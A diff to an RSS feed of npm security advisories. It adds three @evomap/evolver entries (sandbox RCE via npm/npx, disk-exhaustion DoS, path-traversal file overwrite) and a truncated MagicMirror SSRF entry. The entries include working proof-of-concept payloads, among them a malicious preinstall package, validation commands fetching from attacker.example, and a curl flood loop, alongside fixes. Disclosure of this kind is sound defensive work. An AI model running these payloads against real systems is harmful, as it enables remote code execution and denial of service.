@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-05-05T20:20:04.386Z</updated>
+    <updated>2026-05-05T21:18:31.566Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,1131 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@evomap/evolver] @evomap/evolver's validator sandbox allowlist permits `npm`/`npx`, yielding RCE from Hub-delivered validation tasks via lifecycle scripts]]></title>
+        <id>https://github.com/advisories/GHSA-jxh8-jh77-xh6g</id>
+        <link href="https://github.com/advisories/GHSA-jxh8-jh77-xh6g"/>
+        <updated>2026-05-05T21:15:57.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The validator-mode sandbox executor (<code>src/gep/validator/sandboxExecutor.js</code>) places <code>npm</code> and <code>npx</code> in its hard executable allowlist. Because <code>npm install &lt;pkg&gt;</code> and <code>npx -y -p &lt;pkg&gt; &lt;bin&gt;</code> execute arbitrary code by design (preinstall/install/postinstall lifecycle scripts and remote-package bin entries), and because validator nodes consume <code>validation_commands</code> strings from unsigned Hub responses with no per-response signature check, an attacker who controls or MITMs the Hub achieves automatic remote code execution on every validator node within one daemon poll (default 60s).</p>
+<h2 id="details">Details</h2>
+<p>End-to-end chain:</p>
+<ol>
+<li><p><code>src/gep/validator/index.js:71-87</code> — <code>fetchValidationTasks()</code> POSTs to <code>&lt;hub&gt;/a2a/fetch</code> and reads <code>validation_tasks</code> from the JSON response. The outbound request is signed via <code>buildHubHeaders()</code>, but the Hub's response is parsed directly with <code>await res.json()</code> and no signature is verified on <code>data.payload</code>.</p>
+</li>
+<li><p><code>src/gep/validator/index.js:98-108</code> — <code>validateOneTask()</code> extracts <code>task.validation_commands</code> (an array of attacker-controlled strings) and passes it straight to <code>runInSandbox(commands, {})</code>. No call to <code>policyCheck.isValidationCommandAllowed()</code> happens on this path. The author's own comment at <code>sandboxExecutor.js:41-42</code> acknowledges this gap: <em>"This closes the gap where validation_commands go straight from Hub to runInSandbox without passing through policyCheck.isValidationCommandAllowed()."</em></p>
+</li>
+<li><p><code>src/gep/validator/sandboxExecutor.js:172-218</code> — <code>runSingleCommand</code> calls <code>parseCommand(cmd)</code>, then checks <code>ALLOWED_EXECUTABLES.has(parsed.executable)</code>:</p>
+<pre><code class="language-js">// sandboxExecutor.js:35
+const ALLOWED_EXECUTABLES = new Set(['node', 'npm', 'npx']);
+</code></pre>
+<p><code>parseCommand</code> only rejects shell metacharacters (<code>| &amp; ; &gt; &lt; \</code> $<code>) and unbalanced quotes. A string like </code>npm install /tmp/evil-pkg --no-audit --no-fund<code>contains none of those and parses cleanly into</code>{ executable: 'npm', args: [...] }`.</p>
+</li>
+<li><p><code>sandboxExecutor.js:54-66</code> — <code>assertNodeCommandSafe</code> is a no-op for non-<code>node</code> executables:</p>
+<pre><code class="language-js">function assertNodeCommandSafe(parsed) {
+  if (parsed.executable !== 'node') return;   // npm/npx skip every check
+  ...
+}
+</code></pre>
+<p>The <code>BLOCKED_NODE_FLAGS</code> set (<code>-e</code>, <code>-r</code>, <code>--loader</code>, etc.) therefore never gates <code>npm</code> or <code>npx</code> invocations.</p>
+</li>
+<li><p><code>sandboxExecutor.js:213</code> — <code>spawn('npm', [...], { shell: false, cwd: sandboxDir, env })</code> runs <code>npm</code>. npm's documented behavior is to execute the package's <code>preinstall</code>, <code>install</code>, and <code>postinstall</code> scripts; <code>npx</code> downloads a remote package and executes its <code>bin</code> entry. Both yield arbitrary code execution in the validator process's UID/permissions.</p>
+</li>
+<li><p><code>src/gep/validator/index.js:189</code> — the validator daemon polls every 60s by default (<code>EVOLVER_VALIDATOR_DAEMON_INTERVAL_MS</code>), and validator mode is <strong>on by default</strong> since v1.69.0 (<code>isValidatorEnabled()</code> returns <code>true</code> unless explicitly disabled, <code>index.js:25-34</code>).</p>
+</li>
+</ol>
+<p>The "sandbox" is nominal: it sets a fresh <code>cwd</code> and a stripped env (HOME → tmpdir to hide <code>~/.npmrc</code>/<code>~/.ssh</code>), but <code>PATH</code> is preserved (so <code>npm</code>/<code>npx</code> resolve), there is no container/chroot/seccomp/uid drop, and nothing prevents the spawned process from writing arbitrary files, opening outbound connections, or reading any file readable by the validator process.</p>
+<p>The author's documented threat model at <code>sandboxExecutor.js:31-34</code> explicitly includes Hub compromise:</p>
+<blockquote>
+<p>"Any command whose first token is not in this set is rejected before spawn(). This prevents command injection via Hub-delivered task.command strings even if Hub itself is compromised or mis-signs a task."</p>
+</blockquote>
+<p>Putting <code>npm</code> and <code>npx</code> on that allowlist defeats that stated goal — both are arbitrary-code-execution-by-design tools.</p>
+<h2 id="poc">PoC</h2>
+<p>Reproduced against v1.70.0-beta.4 (HEAD on <code>main</code>):</p>
+<p>Step 1 — plant a malicious package locally (the remote-tarball variant works identically; npm fetches and runs lifecycle scripts in both cases):</p>
+<pre><code class="language-bash">mkdir -p /tmp/evil-pkg-validator
+cat &gt; /tmp/evil-pkg-validator/package.json &lt;&lt;'EOF'
+{
+  "name":"evil-pkg-validator","version":"1.0.0",
+  "scripts":{
+    "preinstall":"node -e \"require('fs').writeFileSync('/tmp/pwned-by-validator-test','RCE uid='+process.getuid()+' time='+Date.now())\""
+  }
+}
+EOF
+</code></pre>
+<p>Step 2 — invoke the exact code path used by <code>validateOneTask()</code> when the Hub returns a task with <code>validation_commands: ["npm install /tmp/evil-pkg-validator --no-audit --no-fund"]</code>:</p>
+<pre><code class="language-bash">rm -f /tmp/pwned-by-validator-test
+node -e "
+const s = require('./src/gep/validator/sandboxExecutor');
+s.runInSandbox(
+  ['npm install /tmp/evil-pkg-validator --no-audit --no-fund'],
+  { cmdTimeoutMs: 60000 }
+).then(o =&gt; {
+  console.log('overallOk:', o.overallOk, 'exitCode:', o.results[0].exitCode);
+  console.log('PWNED:', require('fs').readFileSync('/tmp/pwned-by-validator-test','utf8'));
+});"
+</code></pre>
+<p>Observed output (verified):</p>
+<pre><code>overallOk: true exitCode: 0
+PWNED: RCE uid=0 time=1777213140205
+</code></pre>
+<p>The sandbox reports <code>overallOk: true</code> (it sees a clean exit-0 from <code>npm</code>), while the preinstall script has already written <code>/tmp/pwned-by-validator-test</code> outside the sandbox directory — uncontained code execution as the validator UID.</p>
+<p>Remote-only variant (no local file required): a compromised or MITM'd Hub returns:</p>
+<pre><code class="language-json">{ "validation_commands": ["npm install https://attacker.example/evil.tgz --no-audit --no-fund"] }
+</code></pre>
+<p>or</p>
+<pre><code class="language-json">{ "validation_commands": ["npx -y -p evil-pkg@1.0.0 evil-cmd"] }
+</code></pre>
+<p>Both pass <code>parseCommand()</code> (no shell metacharacters), pass <code>ALLOWED_EXECUTABLES.has('npm'|'npx')</code>, and <code>assertNodeCommandSafe</code> is a no-op for them. npm/npx fetch the remote tarball and execute its lifecycle/bin scripts on the validator host.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Arbitrary code execution</strong> as the evolver/validator process UID on every validator node that polls the malicious Hub (one cycle ≈ 60s by default).</li>
+<li><strong>Credential exfiltration</strong>: HUB_NODE_SECRET, A2A node identity, any cloud/cred material readable by the process.</li>
+<li><strong>Persistence / lateral movement</strong>: write to user-writable cron, systemd-user units, shell rc files; pivot into the host's container / VM.</li>
+<li><strong>Wormable across the network</strong>: a single Hub compromise auto-RCEs every node running validator mode — and validator mode is opt-out / on by default since v1.69.0.</li>
+<li><strong>Defeats the documented sandbox guarantee</strong>: the executor advertises defense against a compromised Hub; in practice, two of its three allowed binaries are arbitrary-code-execution tools.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Remove <code>npm</code> and <code>npx</code> from <code>ALLOWED_EXECUTABLES</code>. Validation tasks need only <code>node &lt;script&gt;</code>:</p>
+<pre><code class="language-js">// src/gep/validator/sandboxExecutor.js
+const ALLOWED_EXECUTABLES = new Set(['node']);
+</code></pre>
+<p>If <code>npm test</code> / <code>npx vitest</code> style commands must remain reachable from the Hub path, harden them explicitly:</p>
+<pre><code class="language-js">function assertNpmCommandSafe(parsed) {
+  if (parsed.executable !== 'npm' &amp;&amp; parsed.executable !== 'npx') return;
+  // Block install/exec/run-script that fetch or execute lifecycle scripts.
+  const sub = parsed.args.find((a) =&gt; !a.startsWith('-'));
+  const FORBIDDEN = new Set(['install', 'i', 'add', 'ci', 'exec', 'x', 'run', 'run-script', 'rebuild', 'pack', 'publish']);
+  if (FORBIDDEN.has(sub)) {
+    throw new Error('npm/npx subcommand not allowed in sandbox: ' + sub);
+  }
+  // Require --ignore-scripts on every npm invocation as defense-in-depth.
+  if (parsed.executable === 'npm' &amp;&amp; !parsed.args.includes('--ignore-scripts')) {
+    throw new Error('npm in sandbox requires --ignore-scripts');
+  }
+  // npx always fetches+executes — disallow entirely.
+  if (parsed.executable === 'npx') {
+    throw new Error('npx is not allowed in sandbox');
+  }
+}
+</code></pre>
+<p>Additionally:</p>
+<ol>
+<li><strong>Sign the Hub's <code>/a2a/fetch</code> <em>response</em></strong> the same way outbound requests are signed (<code>buildHubHeaders</code>). Verify the signature on <code>data.payload</code> in <code>fetchValidationTasks</code> before handing tasks to <code>runInSandbox</code>. This closes the network-MITM variant that does not require Hub compromise.</li>
+<li><strong>Run <code>runInSandbox</code> under real isolation</strong> — drop privileges, disable network, mount tmpfs, apply seccomp — rather than relying solely on an allowlist. The current <code>buildSandboxEnv</code> only redirects <code>HOME</code>/<code>TMPDIR</code>; the spawned process otherwise has full host access.</li>
+<li><strong>Apply <code>policyCheck.isValidationCommandAllowed()</code> to Hub-delivered <code>validation_commands</code></strong> in <code>validateOneTask</code>, mirroring the gate that already exists for capsule-derived commands in <code>solidify.js</code> / <code>skill2gep.js</code>.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/EvoMap/evolver/security/advisories/GHSA-jxh8-jh77-xh6g">https://github.com/EvoMap/evolver/security/advisories/GHSA-jxh8-jh77-xh6g</a></li>
+<li><a href="https://github.com/advisories/GHSA-jxh8-jh77-xh6g">https://github.com/advisories/GHSA-jxh8-jh77-xh6g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jxh8-jh77-xh6g</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T21:15:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@evomap/evolver] @evomap/evolver has an unbounded request body in proxy /asset/submit that causes persistent disk-exhaustion DoS]]></title>
+        <id>https://github.com/advisories/GHSA-7xp7-m392-h92c</id>
+        <link href="https://github.com/advisories/GHSA-7xp7-m392-h92c"/>
+        <updated>2026-05-05T21:15:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The EvoMap proxy daemon's HTTP body parser accepts requests of any size, and the <code>POST /asset/submit</code> route persists the full request body — verbatim and uncapped — as a JSONL line in <code>&lt;dataDir&gt;/messages.jsonl</code>. An unauthenticated local attacker (other local user, container neighbor, or malicious npm postinstall script running on the same host) can repeatedly POST large bodies to fill the disk. On restart, the daemon synchronously reads the entire file via <code>fs.readFileSync</code>, making the OOM/crash persistent.</p>
+<h2 id="details">Details</h2>
+<p><strong>1. Entry — unbounded body parser</strong> (<code>src/proxy/server/http.js:9-21</code>):</p>
+<pre><code class="language-js">function parseBody(req) {
+  return new Promise((resolve, reject) =&gt; {
+    const chunks = [];
+    req.on('data', c =&gt; chunks.push(c));
+    req.on('end', () =&gt; {
+      const raw = Buffer.concat(chunks).toString();
+      if (!raw) return resolve({});
+      try { resolve(JSON.parse(raw)); }
+      catch (e) { reject(new Error('Invalid JSON body')); }
+    });
+    req.on('error', reject);
+  });
+}
+</code></pre>
+<p>There is no Content-Length validation and no cumulative-bytes cap on <code>chunks</code>.</p>
+<p><strong>2. Route — no schema or size validation</strong> (<code>src/proxy/server/routes.js:75-85</code>):</p>
+<pre><code class="language-js">'POST /asset/submit': async ({ body }) =&gt; {
+  if (!body.assets &amp;&amp; !body.asset_id) {
+    throw Object.assign(new Error('assets or asset_id is required'), { statusCode: 400 });
+  }
+  const result = store.send({
+    type: 'asset_submit',
+    payload: body,
+    priority: body.priority || 'normal',
+  });
+  return { body: result };
+}
+</code></pre>
+<p>The full <code>body</code> (including arbitrarily large <code>body.assets[*].blob</code>) is forwarded to <code>store.send()</code> as the message payload. <code>POST /mailbox/send</code> has the same shape.</p>
+<p><strong>3. Sink — unbounded JSONL append</strong> (<code>src/proxy/mailbox/store.js</code>):</p>
+<pre><code class="language-js">// line 71-73
+function appendLine(filePath, obj) {
+  fs.appendFileSync(filePath, JSON.stringify(obj) + '\n', 'utf8');
+}
+
+// line 189-209: send() builds a message wrapping the payload and calls _appendMessage
+// line 166-171: _appendMessage(msg) -&gt; appendLine(this._messagesFile, msg)
+</code></pre>
+<p>Every <code>/asset/submit</code> or <code>/mailbox/send</code> request appends one JSONL line proportional in size to the request body. <code>compact()</code> (line 381) only re-writes existing messages; it does not drop or truncate large rows.</p>
+<p><strong>4. Persistence on restart</strong> (<code>src/proxy/mailbox/store.js</code>):</p>
+<pre><code class="language-js">// line 75-86
+function readLines(filePath) {
+  if (!fs.existsSync(filePath)) return [];
+  const content = fs.readFileSync(filePath, 'utf8');  // synchronous, full-file
+  ...
+}
+// line 143-164: _rebuildIndex() called from constructor reads every line
+</code></pre>
+<p>A multi-GB <code>messages.jsonl</code> will OOM the daemon on every startup, making the DoS persistent across restarts.</p>
+<p><strong>5. Auth model</strong> (<code>recon.json</code>, confirmed by inspection of <code>src/proxy/server/http.js:38</code> <code>server.listen(port, '127.0.0.1', ...)</code>):</p>
+<blockquote>
+<p>"HTTP proxy has NO per-request auth (bound to 127.0.0.1 only) … No authentication on HTTP /mailbox, /asset, /task, /session, /dm routes."</p>
+</blockquote>
+<p>Any local process can reach the daemon. Local-only access still admits multi-tenant dev hosts, sandboxes, containers sharing the host network namespace, and malicious npm dependency postinstall scripts.</p>
+<p><strong>6. Why not by-design.</strong> The mailbox is documented as a poll/ack message channel for short metadata. Sister code paths in the repo bound their writes (e.g. <code>appendFailedCapsule</code> with <code>FAILED_CAPSULES_MAX = 200</code>); the absence of any cap on the mailbox path is inconsistent.</p>
+<h2 id="poc">PoC</h2>
+<p>Run from the repo root:</p>
+<pre><code class="language-js">// poc-asset-submit.js
+const http=require('http'),fs=require('fs'),os=require('os'),path=require('path');
+const {MailboxStore}=require('./src/proxy/mailbox/store');
+const {ProxyHttpServer}=require('./src/proxy/server/http');
+const {buildRoutes}=require('./src/proxy/server/routes');
+(async()=&gt;{
+  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'poc-'));
+  const store=new MailboxStore(dir);
+  const handlers={assetFetch:async()=&gt;({}),assetSearch:async()=&gt;({}),assetValidate:async()=&gt;({}),atpPost:async()=&gt;({}),atpGet:async()=&gt;({})};
+  const srv=new ProxyHttpServer(buildRoutes(store,handlers,null,{}),{port:39922,logger:{log:()=&gt;{},error:()=&gt;{},warn:()=&gt;{}}});
+  await srv.start();
+  const send=(mb)=&gt;new Promise((res,rej)=&gt;{
+    const body='{"assets":[{"asset_id":"sha256:dead","blob":"'+'A'.repeat(mb*1024*1024)+'"}]}';
+    const req=http.request({hostname:'127.0.0.1',port:39922,path:'/asset/submit',method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}},r=&gt;{r.resume();r.on('end',res);});
+    req.on('error',rej); req.write(body); req.end();
+  });
+  for(let i=0;i&lt;3;i++){await send(10);console.log('messages.jsonl=',fs.statSync(path.join(dir,'messages.jsonl')).size,'bytes');}
+  await srv.stop(); fs.rmSync(dir,{recursive:true});
+})();
+</code></pre>
+<p>Verified output:</p>
+<pre><code>messages.jsonl= 10486078 bytes
+messages.jsonl= 20972156 bytes
+messages.jsonl= 31458234 bytes
+</code></pre>
+<p>Live exploitation against a running daemon (default port 19820):</p>
+<pre><code>printf '{"assets":[{"blob":"%s"}]}' "$(head -c 10485760 /dev/zero | tr '\0' A)" &gt; /tmp/big.json
+for i in $(seq 1 1000); do
+  curl -s -X POST -H 'Content-Type: application/json' --data-binary @/tmp/big.json http://127.0.0.1:19820/asset/submit
+done
+</code></pre>
+<p><code>&lt;dataDir&gt;/messages.jsonl</code> grows by ~10 MiB per request with no upper bound. After ~N requests, the disk is full or the daemon OOMs on next restart while reading the file.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Disk exhaustion</strong> of <code>&lt;dataDir&gt;</code> filesystem (default <code>~/.evomap/mailbox/</code>). Shared filesystems mean co-located services can crash too.</li>
+<li><strong>Persistent denial of service</strong>: on daemon restart, <code>_rebuildIndex()</code> synchronously reads the whole <code>messages.jsonl</code> via <code>fs.readFileSync</code>, OOM-killing the daemon. Operator must manually delete or truncate the file to recover.</li>
+<li><strong>Memory exhaustion</strong> during the attack: <code>Buffer.concat(chunks).toString()</code> materializes the entire body in memory, so large single requests can also OOM the live daemon before they hit disk.</li>
+<li><strong>Reachable from low-privilege local actors</strong>: malicious npm dependency postinstall scripts, other unprivileged users on shared dev hosts, processes in sibling containers sharing the host network namespace.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<ol>
+<li>Cap body size in <code>parseBody()</code> (<code>src/proxy/server/http.js</code>):</li>
+</ol>
+<pre><code class="language-js">const MAX_BODY_BYTES = 1 * 1024 * 1024; // 1 MiB
+
+function parseBody(req) {
+  return new Promise((resolve, reject) =&gt; {
+    const declared = Number(req.headers['content-length']);
+    if (Number.isFinite(declared) &amp;&amp; declared &gt; MAX_BODY_BYTES) {
+      const err = new Error('Request body too large');
+      err.statusCode = 413;
+      return reject(err);
+    }
+    const chunks = [];
+    let received = 0;
+    req.on('data', c =&gt; {
+      received += c.length;
+      if (received &gt; MAX_BODY_BYTES) {
+        const err = new Error('Request body too large');
+        err.statusCode = 413;
+        req.destroy();
+        return reject(err);
+      }
+      chunks.push(c);
+    });
+    req.on('end', () =&gt; {
+      const raw = Buffer.concat(chunks).toString();
+      if (!raw) return resolve({});
+      try { resolve(JSON.parse(raw)); }
+      catch (e) { reject(new Error('Invalid JSON body')); }
+    });
+    req.on('error', reject);
+  });
+}
+</code></pre>
+<ol start="2">
+<li><p>Add a per-message payload-size budget in <code>MailboxStore.send()</code> / <code>writeInbound()</code> (<code>src/proxy/mailbox/store.js</code>) — reject messages whose serialized size exceeds e.g. 256 KiB, returning a 413 to the caller.</p>
+</li>
+<li><p>Reject specifically large <code>body.assets[*].blob</code> / <code>body.payload</code> shapes in <code>/asset/submit</code> and <code>/mailbox/send</code> handlers in <code>src/proxy/server/routes.js</code> before calling <code>store.send()</code>.</p>
+</li>
+<li><p>(Defense in depth) In <code>_rebuildIndex()</code>, switch <code>readLines()</code> to a streaming line reader (<code>readline.createInterface</code> over <code>fs.createReadStream</code>) so a corrupt or oversized file degrades gracefully instead of OOM-ing on startup.</p>
+</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/EvoMap/evolver/security/advisories/GHSA-7xp7-m392-h92c">https://github.com/EvoMap/evolver/security/advisories/GHSA-7xp7-m392-h92c</a></li>
+<li><a href="https://github.com/advisories/GHSA-7xp7-m392-h92c">https://github.com/advisories/GHSA-7xp7-m392-h92c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7xp7-m392-h92c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T21:15:32.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@evomap/evolver] @evomap/evolver: Path Traversal in `evolver fetch` default-branch `safeId` allows Hub-controlled overwrite of project files (RCE)]]></title>
+        <id>https://github.com/advisories/GHSA-cfcj-hqpf-hccf</id>
+        <link href="https://github.com/advisories/GHSA-cfcj-hqpf-hccf"/>
+        <updated>2026-05-05T21:15:10.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>evolver fetch</code> subcommand in <code>index.js</code> writes Hub-supplied <code>bundled_files[]</code> into a directory derived from a Hub-supplied <code>skill_id</code>. When <code>--out</code> is not used, the path-sanitizing regex permits <code>.</code> characters, allowing a <code>skill_id</code> of <code>..</code> to escape the <code>skills/</code> subdirectory and resolve to the user's current working directory. Combined with the file-extension allow-list (which includes <code>.js</code>/<code>.json</code>/<code>.sh</code>/<code>.py</code>/<code>.md</code>), this lets a malicious Hub overwrite the victim's <code>index.js</code>, <code>package.json</code>, or other files in cwd, achieving remote code execution on the next invocation of the evolver.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerable code is in the <code>fetch</code> command handler:</p>
+<pre><code class="language-js">// index.js:847-873
+const data = await resp.json();
+const outFlag = args.find(a =&gt; typeof a === 'string' &amp;&amp; a.startsWith('--out='));
+const safeId = String(data.skill_id || skillId).replace(/[^a-zA-Z0-9_\-\.]/g, '_');
+let outDir;
+if (outFlag) {
+  const rawOut = outFlag.slice('--out='.length);
+  // ...
+  const resolvedOut = path.resolve(process.cwd(), rawOut);
+  const cwd = path.resolve(process.cwd());
+  const rel = path.relative(cwd, resolvedOut);
+  if (rel.startsWith('..') || path.isAbsolute(rel)) {     // &lt;-- traversal check exists for --out
+    console.error('[fetch] --out= must resolve to a path inside the current working directory');
+    process.exit(1);
+  }
+  outDir = resolvedOut;
+} else {
+  outDir = path.join('.', 'skills', safeId);              // &lt;-- NO traversal check
+}
+
+if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });
+</code></pre>
+<p>Three problems compose:</p>
+<ol>
+<li><strong>The regex allow-list permits <code>.</code></strong> — <code>[^a-zA-Z0-9_\-\.]</code> only strips characters <em>outside</em> this set, so the literal dot is preserved. A <code>skill_id</code> of <code>..</code> (verified: <code>'..'.replace(/[^a-zA-Z0-9_\-\.]/g,'_') === '..'</code>) survives sanitization.</li>
+<li><strong><code>path.join</code> collapses <code>..</code> traversal</strong> — <code>path.join('.', 'skills', '..')</code> evaluates to <code>'.'</code> (the cwd), so <code>outDir</code> is now the user's working directory rather than <code>./skills/&lt;id&gt;</code>.</li>
+<li><strong>The traversal validation only runs in the <code>--out</code> branch</strong> — the default branch (the documented common case for <code>evolver fetch --skill &lt;id&gt;</code>) has no <code>path.relative(...).startsWith('..')</code> check.</li>
+</ol>
+<p>The bundled-files write loop:</p>
+<pre><code class="language-js">// index.js:881-906
+const ALLOWED_SKILL_EXTENSIONS = new Set([
+  '.js', '.mjs', '.cjs', '.ts', '.json', '.md', '.txt',
+  '.sh', '.py', '.yml', '.yaml',
+]);
+// ...
+for (const file of bundled) {
+  if (!file || !file.name || typeof file.content !== 'string') continue;
+  const safeName = path.basename(file.name);                       // basename of "index.js" is "index.js"
+  const ext = path.extname(safeName).toLowerCase();
+  if (!ALLOWED_SKILL_EXTENSIONS.has(ext)) { /* skip */ continue; }
+  if (Buffer.byteLength(file.content, 'utf8') &gt; MAX_SKILL_FILE_BYTES) { /* skip */ continue; }
+  fs.writeFileSync(path.join(outDir, safeName), file.content, 'utf8');
+}
+</code></pre>
+<p><code>path.basename</code> strips directory components from the <em>file name</em>, but a basename of <code>index.js</code> is still <code>index.js</code>. The extension allow-list contains <code>.js</code>, so an attacker can write <code>./index.js</code> (the evolver entry point itself), <code>./package.json</code>, <code>./SKILL.md</code>, etc.</p>
+<p>There is no signature verification on the Hub response. <code>buildHubHeaders()</code> only authenticates the <em>outgoing</em> request; the response body is trusted as-is. The Hub stores skills uploaded by network participants, so any participant who can set a stored <code>skill_id</code> field to <code>..</code> triggers this on every download.</p>
+<h2 id="poc">PoC</h2>
+<p>Reproduces the exact code path from <code>index.js:849-905</code>:</p>
+<pre><code class="language-bash">cd /tmp &amp;&amp; rm -rf evolver-poc-validate &amp;&amp; mkdir evolver-poc-validate &amp;&amp; \
+  cp /path/to/EvoMap-evolver-src/index.js evolver-poc-validate/
+cd evolver-poc-validate
+wc -l index.js                                  # 1098 index.js (legitimate)
+
+node -e "
+const fs=require('fs'),path=require('path');
+const data={
+  skill_id:'..',
+  content:'x',
+  bundled_files:[{name:'index.js',content:'#!/usr/bin/env node\nconsole.log(\"PWNED\");'}]
+};
+const safeId=String(data.skill_id||'x').replace(/[^a-zA-Z0-9_\-\.]/g,'_');
+const outDir=path.join('.','skills',safeId);
+console.log('safeId:',JSON.stringify(safeId));   // '..'
+console.log('outDir:',JSON.stringify(outDir));   // '.'
+if(!fs.existsSync(outDir))fs.mkdirSync(outDir,{recursive:true});
+for(const f of data.bundled_files){
+  const n=path.basename(f.name);
+  fs.writeFileSync(path.join(outDir,n),f.content);
+}"
+
+wc -l index.js                                  # 1 index.js  (clobbered)
+head -3 index.js
+# #!/usr/bin/env node
+# console.log("PWNED");
+</code></pre>
+<p>Verified output: 1098 → 1 line; the legitimate evolver entry point is replaced with attacker-controlled JavaScript. Any subsequent <code>node index.js &lt;command&gt;</code> (including the <code>--loop</code> daemon mode that users run continuously) executes the attacker payload.</p>
+<p>End-to-end attack:</p>
+<ol>
+<li>Attacker uploads a skill to the A2A Hub whose stored <code>skill_id</code> is <code>..</code> (or operates a malicious Hub / MitMs the connection / supplies a malicious <code>A2A_HUB_URL</code>).</li>
+<li>The malicious response also carries <code>bundled_files: [{name: 'index.js', content: '&lt;attacker JS&gt;'}]</code>.</li>
+<li>Victim runs <code>node index.js fetch --skill=anything</code> from the evolver checkout (the documented usage).</li>
+<li><code>./index.js</code> is overwritten in place.</li>
+<li>Victim's next <code>node index.js</code> invocation — even just <code>node index.js --help</code> or the <code>run --loop</code> daemon — executes attacker code with the victim's privileges.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Remote code execution</strong> in the victim's environment with the privileges of the evolver process. Because the loop daemon (<code>node index.js run --loop</code>) is the documented long-running mode, the malicious code typically gets executed within seconds of the next iteration.</li>
+<li>Attacker can also overwrite <code>package.json</code> (allowed extension), <code>SKILL.md</code>, <code>.env</code>-adjacent <code>.json</code>/<code>.yaml</code>/<code>.yml</code> config files, and any whitelisted file already present in the cwd.</li>
+<li>Trust boundary violation: <code>evolver fetch</code> is presented as a <em>download</em> operation; users would not expect it to overwrite the application binary or project files. The <code>--out</code> branch was hardened against exactly this; the default branch was missed.</li>
+<li>A single malicious skill upload compromises every user that fetches it.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Reject <code>safeId</code> values that are not single non-traversing path segments before joining, or reuse the same <code>path.relative</code> check used in the <code>--out</code> branch. Minimal patch around <code>index.js:849</code>:</p>
+<pre><code class="language-js">const safeId = String(data.skill_id || skillId).replace(/[^a-zA-Z0-9_\-\.]/g, '_');
+if (
+  safeId === '' ||
+  safeId === '.' ||
+  safeId === '..' ||
+  safeId.includes('/') ||
+  safeId.includes('\\') ||
+  safeId.includes('\0')
+) {
+  console.error('[fetch] Hub returned an invalid skill_id: ' + JSON.stringify(safeId));
+  process.exit(1);
+}
+</code></pre>
+<p>Defense in depth — apply the existing traversal check to the default branch as well:</p>
+<pre><code class="language-js">} else {
+  const candidate = path.resolve(process.cwd(), 'skills', safeId);
+  const skillsRoot = path.resolve(process.cwd(), 'skills');
+  const rel = path.relative(skillsRoot, candidate);
+  if (rel.startsWith('..') || path.isAbsolute(rel)) {
+    console.error('[fetch] Hub returned a skill_id that escapes the skills/ directory');
+    process.exit(1);
+  }
+  outDir = candidate;
+}
+</code></pre>
+<p>Additionally, consider:</p>
+<ul>
+<li>Removing <code>.</code> from the regex allow-list (skill IDs typically don't need dots).</li>
+<li>Verifying a Hub-supplied signature over the response payload before writing any file to disk.</li>
+<li>Disallowing bundled-file <code>safeName</code> values that match top-level project files (<code>index.js</code>, <code>package.json</code>, <code>package-lock.json</code>, etc.) regardless of <code>outDir</code>.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/EvoMap/evolver/security/advisories/GHSA-cfcj-hqpf-hccf">https://github.com/EvoMap/evolver/security/advisories/GHSA-cfcj-hqpf-hccf</a></li>
+<li><a href="https://github.com/advisories/GHSA-cfcj-hqpf-hccf">https://github.com/advisories/GHSA-cfcj-hqpf-hccf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cfcj-hqpf-hccf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T21:15:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[magicmirror] MagicMirror vulnerable to unauthenticated SSRF via /cors endpoint]]></title>
+        <id>https://github.com/advisories/GHSA-ph6f-2cvq-79hq</id>
+        <link href="https://github.com/advisories/GHSA-ph6f-2cvq-79hq"/>
+        <updated>2026-05-05T20:54:01.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unauthenticated Server-Side Request Forgery (SSRF) vulnerability in the <code>/cors</code> endpoint allows any remote attacker to force the MagicMirror² server to perform arbitrary HTTP requests to internal networks, cloud metadata services, and localhost services. The endpoint also expands environment variable placeholders (<code>**VAR_NAME**</code>), enabling exfiltration of server-side secrets.</p>
+<h3 id="details">Details</h3>
